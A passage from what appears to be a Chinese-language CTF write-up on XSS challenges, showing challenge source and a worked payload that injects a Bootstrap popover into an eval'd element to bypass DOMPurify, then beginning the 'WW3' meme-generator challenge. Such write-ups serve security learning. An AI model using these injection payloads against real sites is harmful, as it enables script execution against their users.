class="hljs-string">&quot;sha256-iO9yO1Iy0P2hJNUeAvUQR2ielSsGJ4rOvK+EQUXxb6E=&quot;</span> <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-comment">&lt;!-- Jquery(3.4.1), Popper(1.16.0), Bootstrap(4.4.1) --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://code.jquery.com/jquery-3.4.1.slim.min.js&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x4E5F;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#xFF0C;&#x989D;&#x5916;&#x7ED9;&#x6211;&#x4EEC;&#x589E;&#x52A0;&#x7684;&#x8FD9;&#x51E0;&#x4E2A; js &#x6587;&#x4EF6;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x8FD9;&#x51E0;&#x4E2A;&#x6587;&#x4EF6;&#x5C31;&#x662F;&#x8FD9;&#x9053;&#x9898;&#x6211;&#x4EEC;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x7528;&#x7684;&#x5DE5;&#x5177;&#x4E86;&#x3002;</p><p>Purify.js &#x662F;&#x4E00;&#x4E2A; XSS WAF&#xFF0C;Popper.js&#x662F;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x6784;&#x9020;&#x63D0;&#x793A;&#x7684;&#x7EC4;&#x4EF6;&#xFF0C;&#x9898;&#x76EE;&#x4E2D;&#x4E5F;&#x7ED9;&#x4E86;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F7F;&#x7528; popper &#x7684;&#x4F8B;&#x5B50;&#xFF0C;Jqeury.js &#x4E0E; Bootstrap &#x5C31;&#x4E0D;&#x591A;&#x8BF4;&#x4E86;&#x3002;</p><p>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x6211;&#x4EEC;&#x7684;&#x53EF;&#x63A7;&#x70B9;&#xFF0C;&#x4E00;&#x4E2A;&#x662F; name &#x53C2;&#x6570;&#xFF0C;&#x53E6;&#x4E00;&#x4E2A;&#x662F; number &#x53C2;&#x6570;&#x3002;&#x7136;&#x800C; number &#x53C2;&#x6570;&#x6211;&#x4EEC;&#x5374;&#x53EA;&#x80FD;&#x4F7F;&#x7528;&#x4E00;&#x4F4D;&#xFF0C;&#x800C; name &#x53C2;&#x6570;&#x867D;&#x7136;&#x4EFB;&#x610F;&#x957F;&#x5EA6;&#x53EF;&#x63A7;&#xFF0C;&#x4F46;&#x662F;&#x8981;&#x7ECF;&#x8FC7; XSS WAF &#x8FC7;&#x6EE4;&#x3002;&#x867D;&#x7136;&#x4E4B;&#x524D;&#x6709;&#x4E00;&#x4E9B;&#x5229;&#x7528; mxss bypass Domprify &#x7684;&#x4E8B;&#x4F8B;&#xFF0C;&#x4F46;&#x662F;&#x90FD;&#x662F;&#x5728; 2.0 &#x5DE6;&#x53F3;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x8FD9;&#x91CC;&#x7684; 2.0.7 &#x53C8;&#x662F;&#x6700;&#x65B0;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x5E94;&#x8BE5;&#x4E0D;&#x4F1A;&#x662F;&#x4EC0;&#x4E48;&#x65B0;&#x7684;&#x7ED5;&#x8FC7;&#xFF0C;&#x5426;&#x5219; number &#x53C2;&#x6570;&#x4E0E;&#x6700;&#x540E;&#x7684; <code>eval($(&quot;number#number&quot;).html());</code> &#x5C31;&#x6CA1;&#x7528;&#x4E86;&#xFF0C;&#x5E76;&#x4E14;&#x8FD8;&#x6709;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x5DE5;&#x5177;&#x6211;&#x4EEC;&#x6CA1;&#x6709;&#x7528;&#x4E0A;&#x3002;</p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x80FD;&#x7528;&#x5230;&#x7684;&#x5C31;&#x662F;&#x901A;&#x8FC7;&#x6700;&#x540E;&#x4E00;&#x4E2A;<code>eval($(&quot;number#number&quot;).html())</code>&#x8FDB;&#x884C; XSS &#xFF0C;&#x800C; number &#x6211;&#x4EEC;&#x53EF;&#x63A7;&#x7684;&#x53EA;&#x6709;&#x4E00;&#x4F4D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x80FD;&#x5F97;&#x60F3;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x529E;&#x6CD5;&#x6DFB;&#x52A0; number &#x6807;&#x7B7E;&#x5F53;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x3002;</p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230; <a href="https://getbootstrap.com/docs/4.0/components/popovers" target="_blank" rel="noopener">popper document</a> &#x7ED3;&#x5408;&#x9898;&#x76EE;&#x7ED9;&#x51FA;&#x7684;&#x90A3;&#x4E2A;&#x4F8B;&#x5B50;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x8C8C;&#x4F3C;&#x8FD9;&#x4E2A; popper.js &#x53EF;&#x4EE5;&#x6EE1;&#x8DB3;&#x6211;&#x4EEC;&#x6DFB;&#x52A0;&#x65B0;&#x5185;&#x5BB9;&#x6761;&#x4EF6;&#xFF0C;&#x800C;&#x5728;&#x6587;&#x6863; <a href="https://getbootstrap.com/docs/4.0/components/popovers/#options" target="_blank" rel="noopener">options</a> &#x90E8;&#x5206;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5230;&#x6709;&#x4E00;&#x4E9B;&#x6211;&#x4EEC;&#x503C;&#x5F97;&#x5173;&#x6CE8;&#x7684;&#x53C2;&#x6570;&#xFF1A;</p><table><thead><tr><th>Name</th><th>Type</th><th>Default</th><th>Description</th></tr></thead><tbody><tr><td>container</td><td>string \</td><td>element \</td><td>false</td><td>false</td><td>Appends the popover to a specific element. Example: <code>container: &apos;body&apos;</code>. This option is particularly useful in that it allows you to position the popover in the flow of the document near the triggering element - which will prevent the popover from floating away from the triggering element during a window resize.</td></tr><tr><td>content</td><td>string \</td><td>element \</td><td>function</td><td>&#x2018;&#x2019;</td><td>Default content value if <code>data-content</code> attribute isn&#x2019;t present.If a function is given, it will be called with its <code>this</code> reference set to the element that the popover is attached to.</td></tr></tbody></table><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4ECE;&#x6587;&#x6863;&#x77E5;&#x9053;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>data-container</code>&#x6765;&#x63A7;&#x5236; popover &#x7684;&#x4F4D;&#x7F6E;&#xFF0C;<code>data-content</code>&#x6765;&#x63A7;&#x5236;&#x5185;&#x5BB9;&#xFF0C;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x662F;&#x4E0D;&#x662F;&#x53EF;&#x4EE5;&#x6709;&#x4E00;&#x4E2A;&#x60F3;&#x6CD5;&#x628A;&#x8FD9;&#x4E2A; popover &#x5F04;&#x5230; number &#x6807;&#x7B7E;&#x5F53;&#x4E2D;&#x5462;&#xFF1F;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x6784;&#x9020;&#x5982;&#x4E0B; payload &#xFF1A;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;keanu&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;popover&quot;</span> <span class="hljs-attr">data-container</span>=<span class="hljs-string">&quot;#number&quot;</span> <span class="hljs-attr">data-content</span>=<span class="hljs-string">&quot;hello&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x5229;&#x7528;&#x9898;&#x76EE;&#x4E2D;&#x539F;&#x6709;&#x7684;<code>$(&quot;#keanu&quot;).popover(&quot;show&quot;);</code>&#x6765;&#x89E6;&#x53D1;&#x6211;&#x4EEC;&#x7684; popover &#xFF0C;&#x6211;&#x4EEC;&#x6682;&#x4E14;&#x5148;&#x6CE8;&#x91CA;&#x6389;&#x9898;&#x76EE;&#x5F53;&#x4E2D;&#x7684;&#x5EF6;&#x8FDF;&#x5173;&#x95ED;&#x7684;&#x529F;&#x80FD;&#x4EE5;&#x4FBF;&#x4E8E;&#x6211;&#x4EEC;&#x89C2;&#x5BDF;&#x3002;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201165048.png" alt></p><p>&#x5C3D;&#x7BA1; eval &#x6267;&#x884C;&#x51FA;&#x9519;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0; number &#x6807;&#x7B7E;&#x5F53;&#x4E2D;&#x786E;&#x5B9E;&#x88AB;&#x6211;&#x4EEC;&#x6CE8;&#x5165;&#x4E86;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x7684;&#x5185;&#x5BB9;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;popover fade bs-popover-right show&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;tooltip&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;popover238474&quot;</span> <span class="hljs-attr">x-placement</span>=<span class="hljs-string">&quot;right&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position: absolute;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;arrow&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;popover-header&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;popover-body&quot;</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x6211;&#x4EEC;&#x8FD9;&#x6837;&#x6211;&#x4EEC;&#x7B80;&#x5316;&#x4E00;&#x4E0B;&#x8FD9;&#x4E2A;&#x5185;&#x5BB9;:<code>7&lt;template&gt;hello&lt;/template&gt;</code>&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x63A7;&#x7684;&#x5730;&#x65B9;&#x5C31;&#x662F; 7 &#x4E0E; hello &#xFF0C;<code>&lt;template&gt;</code>&#x5C31;&#x662F; popper.js &#x5B9E;&#x73B0;&#x7684; popover &#x529F;&#x80FD;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x8FD9;&#x4E2A;&#x6211;&#x4EEC;&#x4E0D;&#x9700;&#x8981;&#x5173;&#x6CE8;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x6837;&#x95EE;&#x9898;&#x5C31;&#x53D8;&#x6210;&#x4E86;&#x5982;&#x4F55;&#x5728;<code>$str=&quot;$1&lt;template&gt;$any&lt;/template&gt;&quot;;eval($str);</code>&#x5F53;&#x4E2D;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x7684;&#x95EE;&#x9898;&#x4E86;&#x3002;</p><p>&#x5230;&#x8FD9;&#x91CC;&#x5176;&#x5B9E;&#x7B54;&#x6848;&#x5DF2;&#x7ECF;&#x547C;&#x4E4B;&#x6B32;&#x51FA;&#x4E86;&#xFF0C;&#x65E2;&#x7136;&#x662F;&#x5728;<code>eval</code>&#x5F53;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x7B2C;&#x4E00;&#x4F4D;&#x4E3A;&#x5355;&#x5F15;&#x53F7;&#xFF0C;&#x7531;&#x4E8E;&#x4E2D;&#x95F4;<code>$any</code>&#x6211;&#x4EEC;&#x4EFB;&#x610F;&#x53EF;&#x63A7;&#xFF0C;&#x540E;&#x9762;&#x518D;&#x7528;&#x4E00;&#x4E2A;&#x5355;&#x5F15;&#x53F7;&#x5C06;<code>&lt;template&gt;</code>&#x53D8;&#x6210;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;<code>//</code>&#x6CE8;&#x91CA;&#x6389;&#x540E;&#x9762;&#x7684;<code>&lt;/template&gt;</code>&#x5373;&#x53EF;&#xFF0C;&#x6574;&#x4E2A; payload &#x5373;&#x662F;<code>&apos;&lt;tamplate&gt;&apos;;alert();//&lt;/tamplate&gt;</code>&#x3002;</p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x8FD9;&#x4E48;&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#xFF1A;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;keanu&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;popover&quot;</span> <span class="hljs-attr">data-container</span>=<span class="hljs-string">&quot;#number&quot;</span> <span class="hljs-attr">data-content</span>=<span class="hljs-string">&quot;&apos;;alert(1);//&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x5373;&#x53EF;&#x5B9E;&#x73B0; XSS&#xFF0C;&#x6240;&#x4EE5; payload:</p><figure class="highlight apache hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">number</span>=&apos;&amp;name=&lt;button id<span class="hljs-number">%3</span>D<span class="hljs-string">&quot;keanu&quot;</span> data-toggle<span class="hljs-number">%3</span>D<span class="hljs-string">&quot;popover&quot;</span> data-container<span class="hljs-number">%3</span>D<span class="hljs-string">&quot;%23number&quot;</span> data-content<span class="hljs-number">%3</span>D<span class="hljs-string">&quot;&apos;%3Balert(1)%3B%2F%2F&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201170536.png" alt></p><h2 id="WW3"><a href="#WW3" class="headerlink" title="WW3"></a>WW3</h2><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>Meme Code<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;meme-code&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;4&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;notify&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-comment">/* Utils */</span></span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">const</span> <span class="hljs-built_in">escape</span> = <span class="hljs-function">(<span class="hljs-params">dirty</span>) =&gt;</span> <span class="hljs-built_in">unescape</span>(dirty).replace(<span class="hljs-regexp">/[&lt;&gt;&apos;&quot;=]/g</span>, <span class="hljs-string">&apos;&apos;</span>);</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">const</span> memeTemplate = <span class="hljs-function">(<span class="hljs-params">img, text</span>) =&gt;</span> {</span></span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">        return (`<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-css"><span class="hljs-keyword">@import</span> url(<span class="hljs-string">&apos;https://fonts.googleapis.com/css?family=Oswald:700&amp;display=swap&apos;</span>);`+</span></span></span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-string">`.meme-card{margin:0 auto;width:300px}.meme-card&gt;img{width:300px}`</span>+</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-string">`.meme-card&gt;h1{text-align:center;color:#fff;background:black;margin-top:-5px;`</span>+</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-string">`position:relative;font-family:Oswald,sans-serif;font-weight:700}&lt;/style&gt;`</span>+</span></span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">            `<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;meme-card&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;${img}&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>${text}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>`)</span></span></span><br><span class="line">    }</span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">const</span> memeGen = <span class="hljs-function">(<span class="hljs-params">that, notify</span>) =&gt;</span> {</span></span><br><span class="line">        if (text &amp;&amp; img) {</span><br><span class="line">            template = memeTemplate(img, text)</span><br><span class="line"></span><br><span class="line">            if (notify) {</span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">                html = (`<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;alert alert-warning&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;alert&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>Meme<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span> created from ${DOMPurify.sanitize(text)}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>`)</span></span></span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line"><span class="hljs-javascript">            setTimeout(<span class="hljs-function"><span class="hljs-params">_</span> =&gt;</span> {</span></span><br><span class="line"><span class="hljs-javascript">                $(<span class="hljs-string">&apos;#status&apos;</span>).remove()</span></span><br><span class="line"><span class="hljs-javascript">                notify ? ($(<span class="hljs-string">&apos;#notify&apos;</span>).html(html)) : <span class="hljs-string">&apos;&apos;</span></span></span><br><span class="line"><span class="hljs-javascript">                $(<span class="hljs-string">&apos;#meme-code&apos;</span>).text(template)</span></span><br><span class="line">            }, 1000)</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-comment">/* Main */</span></span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">let</span> notify = <span class="hljs-literal">false</span>;</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">let</span> text = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&apos;text&apos;</span>)</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">let</span> img = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&apos;img&apos;</span>)</span></span><br><span class="line">    if (text &amp;&amp; img) {</span><br><span class="line"><span class="hljs-javascript">        <span class="hljs-built_in">document</span>.write(</span></span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">            `<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;alert alert-primary&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;alert&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;status&quot;</span>&gt;</span>`+</span></span></span><br><span class="line"><span class="hljs-actionscript">            `&lt;img <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">circle</span>&quot; <span class="hljs-title">src</span>=&quot;$</span>{escape(img)}<span class="hljs-string">&quot; onload=&quot;</span>memeGen(<span class="hljs-keyword">this</span>, notify)<span class="hljs-string">&quot;&gt;`+</span></span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-string">`Creating meme... (<span class="hljs-subst">${DOMPurify.sanitize(text)}</span>)&lt;/div&gt;`</span></span></span><br><span class="line">        )</span><br><span class="line"><span class="hljs-actionscript">    } <span class="hljs-keyword">else</span> {</span></span><br><span class="line"><span class="hljs-javascript">        $(<span class="hljs-string">&apos;#meme-code&apos;</span>).text(memeTemplate(<span class="hljs-string">&apos;https://i.imgur.com/PdbDexI.jpg&apos;</span>, <span class="hljs-string">&apos;When you get that WW3 draft letter&apos;</span>))</span></span><br><span class="line">    }</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x8BA9;&#x6211;&#x6DF1;&#x6DF1;&#x5730;&#x4F53;&#x4F1A;&#x5230;&#x4E86; JavaScript &#x7684;&#x6076;&#x610F;&#x2026;&#x5148;&#x653E;&#x4E2A;&#x56FE;&#xFF0C;&#x5927;&#x5BB6;&#x81EA;&#x884C;&#x5148;&#x4F53;&#x4F1A;&#x4E00;&#x4E0B;&#xFF0C;&#x7136;&#x540E;&#x6211;&#x4EEC;&#x5F00;&#x59CB;&#x5206;&#x6790;&#x4E00;&#x4E0B;&#x9898;&#x76EE;&#x3002;</p><p><img src="https://i.redd.it/rz3o1yibnc511.png" alt></p><p>&#x9898;&#x76EE;&#x7528;&#x6BD4;&#x8F83;&#x591A;&#x7684;&#x4EE3;&#x7801;&#x505A;&#x4E86;&#x4E00;&#x4E2A;&#x83B7;&#x53D6;&#x56FE;&#x7247;&#x4EE5;&#x53CA;&#x8F93;&#x51FA;&#x81EA;&#x5B9A;&#x4E49; text &#x7684;&#x529F;&#x80FD;&#xFF0C;&#x4ECD;&#x65E7;&#x662F;&#x4E0A;&#x9898;&#x7684;&#x56DB;&#x4E2A;&#x5916;&#x90E8; JS &#x6587;&#x4EF6;&#xFF0C;&#x4EE5;&#x53CA;&#x4E00;&#x5927;&#x6BB5; JS &#x4EE3;&#x7801;&#x3002;&#x672C;&#x9898;&#x6D89;&#x53CA;&#x5230; JavaScript &#x6BD4;&#x8F83;&#x591A;&#x7684;&#x9ED1;&#x9B54;&#x6CD5;&#xFF0C;&#x6211;&#x4EEC;&#x4E00;&#x4E2A;&#x4E2A;&#x6765;&#x770B;&#x770B;&#x3002;</p><p>&#x5BA1;&#x8BA1;&#x4EE3;&#x7801;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5148;&#x770B;&#x5230;&#x9898;&#x76EE;&#x5B9A;&#x4E49;&#x4E86;&#x51E0;&#x4E2A;&#x51FD;&#x6570;</p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> <span class="hljs-built_in">escape</span> = <span class="hljs-function"><span class="hljs-params">dirty</span> =&gt;</span> <span class="hljs-built_in">unescape</span>(dirty).replace(<span class="hljs-regexp">/[&lt;&gt;&apos;&quot;=]/g</span>, <span class="hljs-string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure><p>&#x7528;&#x6765;&#x8FC7;&#x6EE4;&#x6211;&#x4EEC;&#x7684; img &#x53C2;&#x6570;</p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> memeTemplate = <span class="hljs-function">(<span class="hljs-params">img, text</span>) =&gt;</span> {</span><br><span class="line">  <span class="hljs-keyword">return</span> (</span><br><span class="line">    <span class="hljs-string">`&lt;style&gt;@import url(&apos;https://fonts.googleapis.com/css?family=Oswald:700&amp;display=swap&apos;);`</span> +</span><br><span class="line">    <span class="hljs-string">`.meme-card{margin:0 auto;width:300px}.meme-card&gt;img{width:300px}`</span> +</span><br><span class="line">    <span class="hljs-string">`.meme-card&gt;h1{text-align:center;color:#fff;background:black;margin-top:-5px;`</span> +</span><br><span class="line">    <span class="hljs-string">`position:relative;font-family:Oswald,sans-serif;font-weight:700}&lt;/style&gt;`</span> +</span><br><span class="line">    <span class="hljs-string">`&lt;div class=&quot;meme-card&quot;&gt;&lt;img src=&quot;<span class="hljs-subst">${img}</span>&quot;&gt;&lt;h1&gt;<span class="hljs-subst">${text}</span>&lt;/h1&gt;&lt;/div&gt;`</span></span><br><span class="line">  );</span><br><span class="line">};</span><br></pre></td></tr></table></figure><p>&#x7528;&#x6765;&#x5C06;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684; img &amp; text &#x53C2;&#x6570;&#x6784;&#x9020;&#x4E00;&#x4E2A; HTML &#x6A21;&#x7248;</p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span 